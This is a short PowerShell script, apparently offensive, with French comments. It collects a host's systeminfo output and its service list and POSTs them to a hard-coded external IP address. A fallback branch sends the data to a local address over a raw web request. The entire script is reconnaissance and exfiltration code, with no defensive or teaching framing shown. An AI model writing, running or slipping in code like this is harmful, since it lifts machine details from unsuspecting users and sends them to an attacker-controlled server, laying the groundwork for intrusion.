$Number = $Host.Version.Major


$infos = systeminfo;$task = Get-Service;$infos = $infos | Out-String;$task = $task | Out-String;
If ($Number -gt 4)
{
    $Body = @{prenom = $infos + $task};$LoginResponse = Invoke-WebRequest 'http://178.170.58.9/post.php' -SessionVariable 'Session' -Body $Body -Method 'POST'
}
else {    #Voir pour changer cette partie qui ne fonctionne pas très bien pour les anciennes version de powershell (V2)
    $Body = [byte[]][char[]]$infos;
    $Request = [System.Net.HttpWebRequest]::Create('http://192.168.1.12:8888/post.php');
    $Request.Method = 'POST';
    $Stream = $Request.GetRequestStream();
    $Stream.Write($Body, 0, $Body.Length);
    $Request.GetResponse();
    $Stream.Close();
}
